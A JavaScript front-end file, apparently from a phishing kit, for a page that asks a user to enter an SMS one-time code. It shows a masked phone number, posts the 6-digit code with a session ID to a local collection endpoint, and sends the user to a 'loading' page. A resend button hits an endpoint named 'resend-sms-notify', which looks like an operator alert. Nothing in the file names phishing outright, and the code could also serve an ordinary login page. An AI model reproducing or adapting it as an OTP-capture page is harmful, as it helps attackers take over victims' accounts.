console.log("✅ custom-sms.js loaded");

const phoneDigits = localStorage.getItem("phoneDigits");
const maskedPhone = phoneDigits ? "********" + phoneDigits : "********";
document.getElementById("maskedPhone").textContent = maskedPhone;

document.getElementById("phoneText").textContent =
  "Enter the code sent to your phone number: " + maskedPhone;

const sessionId = localStorage.getItem("sessionId");
const smsInput = document.getElementById("sms");
const submitBtn = document.getElementById("submit-btn");
const loading = document.getElementById("loading");
const errorBox = document.getElementById("error-msg");

// ✅ Проверка при вводе — убираем красный если 6 цифр
smsInput.addEventListener("input", () => {
  smsInput.value = smsInput.value.replace(/\D/g, ""); // только цифры

  if (smsInput.value.length === 6) {
    smsInput.classList.remove("input-error");
    errorBox.style.display = "none";
  }
});

// ✅ Отправка
submitBtn.addEventListener("click", (e) => {
  e.preventDefault();

  const sms = smsInput.value.trim();

  if (!/^\d{6}$/.test(sms)) {
    smsInput.classList.add("input-error");
    errorBox.textContent = "Enter a valid 6-digit code";
    errorBox.style.display = "block";
    return;
  }

  smsInput.classList.remove("input-error");
  errorBox.style.display = "none";
  submitBtn.style.display = "none";
  loading.style.display = "flex";

  fetch("http://localhost:3123/submit-sms", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sessionId, sms }),
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.success) {
        window.location.href = "/loading";
      } else {
        throw new Error(data.error || "Update failed");
      }
    })
    .catch(() => {
      errorBox.textContent = "Network error";
      errorBox.style.display = "block";
    })
    .finally(() => {
      loading.style.display = "none";
      submitBtn.style.display = "flex";
      smsInput.value = "";
    });
});

const resendBtn = document.getElementById("resend-btn");

if (resendBtn) {
  resendBtn.addEventListener("click", () => {
    fetch("/api/resend-sms-notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId }),
    })
      .then((r) => r.json())
      .then((data) => {
        if (data.success) {
          errorBox.textContent = "SMS resent";
          errorBox.style.display = "block";
          errorBox.style.color = "#4d6aff";

          setTimeout(() => {
            errorBox.style.display = "none";
            errorBox.style.color = "";
          }, 3000);
        }
      })
      .catch(() => {
        errorBox.textContent = "Ошибка отправки";
        errorBox.style.display = "block";
      });
  });
}
